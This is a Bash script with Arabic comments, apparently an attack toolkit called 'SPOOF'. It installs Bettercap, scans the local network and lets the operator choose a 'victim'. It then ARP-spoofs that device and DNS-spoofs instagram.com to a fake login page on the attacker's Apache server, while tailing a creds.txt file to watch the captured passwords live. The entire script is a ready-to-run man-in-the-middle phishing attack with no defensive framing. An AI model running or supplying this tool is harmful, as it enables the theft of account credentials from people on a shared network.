
#!/bin/bash

# === شعار Spoof ===
clear
echo ""
echo "  ██████  ███████  ██████  ███████  ███████ "
echo " ██      ██      ██       ██       ██      "
echo " ██  ███ █████   ██   ██  █████    █████   "
echo " ██   ██ ██      ██   ██  ██       ██      "
echo "  ██████ ███████  ██████  ██       ███████ "
echo ""
echo "        [🔥 Welcome to SPOOF 🔥]"
echo "     - DNS/ARP Sniffing Toolkit -"
echo ""

sleep 2

# === التحقق من وجود الصفحة المزيفة ===
if [ ! -f /var/www/html/index.html ]; then
  echo "[!] ⚠️ لم يتم العثور على صفحة index.html في /var/www/html"
  echo "[!] الرجاء وضع ملفات الصفحة المزيفة أولاً!"
  exit 1
fi

# === التحقق من وجود Bettercap ===
if ! command -v bettercap &> /dev/null; then
  echo "[!] ⚙️ Bettercap غير مثبت، جاري تثبيته ..."
  sudo apt update
  sudo apt install -y build-essential libpcap-dev unzip wget

  wget https://github.com/bettercap/bettercap/releases/download/v2.32.0/bettercap_linux_amd64_2.32.0.zip -O bettercap.zip
  unzip bettercap.zip
  chmod +x bettercap
  sudo mv bettercap /usr/local/bin/
  rm bettercap.zip
  echo "[+] ✅ تم تثبيت Bettercap."
else
  echo "[+] ✅ Bettercap مثبت."
fi

# === التحقق من وجود arp-scan ===
if ! command -v arp-scan &> /dev/null; then
  echo "[!] ⚙️ الأداة arp-scan غير مثبتة. تثبيت ..."
  sudo apt install -y arp-scan
fi

# === تشغيل Apache ===
echo "[*] 🚀 تشغيل خادم Apache ..."
sudo service apache2 restart

# === IP والواجهة ===
MY_IP=$(hostname -I | awk '{print $1}')
INTERFACE=$(ip -o -4 route show to default | awk '{print $5}')
echo "[+] 📡 عنوان IP الخاص بك: $MY_IP"
echo "[+] 🌐 الواجهة المستخدمة: $INTERFACE"

# === فحص الشبكة ===
echo "[*] 🔍 البحث عن الأجهزة المتصلة ..."
sudo arp-scan --interface=$INTERFACE --localnet > devices.txt

# === عرض الأجهزة ===
echo "[*] 🖥️ الأجهزة المتصلة:"
awk '/([0-9]{1,3}\.){3}[0-9]{1,3}/ {printf "[%d] %s - %s - %s
", NR, $1, $2, $3}' devices.txt

read -p "[?] اختر رقم الجهاز الهدف: " CHOICE
VICTIM_IP=$(awk -v num=$CHOICE 'NR==num {print $1}' devices.txt)

if [ -z "$VICTIM_IP" ]; then
  echo "[!] ❌ لم يتم تحديد IP صالح."
  exit 1
fi

echo "[+] 🎯 تم اختيار الضحية: $VICTIM_IP"

# === إعداد موقع Instagram المزيف فقط ===
DOMAIN="instagram.com,www.instagram.com"
SITE_NAME="Instagram"
echo "[+] 🎭 سيتم توجيه الضحية إلى صفحة $SITE_NAME المزيفة."

# === تجهيز سكربت Bettercap ===
cat <<EOF > bettercap_script.cap
set arp.spoof.targets $VICTIM_IP
set arp.spoof.internal true
arp.spoof on
set dns.spoof.all true
set dns.spoof.domains $DOMAIN
set dns.spoof.address $MY_IP
dns.spoof on
net.sniff on
EOF

# === مراقبة كلمات المرور ===
echo "[*] 🔐 مراقبة ملف creds.txt ..."
gnome-terminal -- bash -c "echo '[+] مراقبة كلمات المرور في الوقت الحقيقي'; tail -f /var/www/html/creds.txt; exec bash"

# === تشغيل Bettercap ===
echo "[*] ⚡ تشغيل Bettercap ..."
sudo bettercap -iface $INTERFACE -caplet bettercap_script.cap | tee bettercap_log.txt
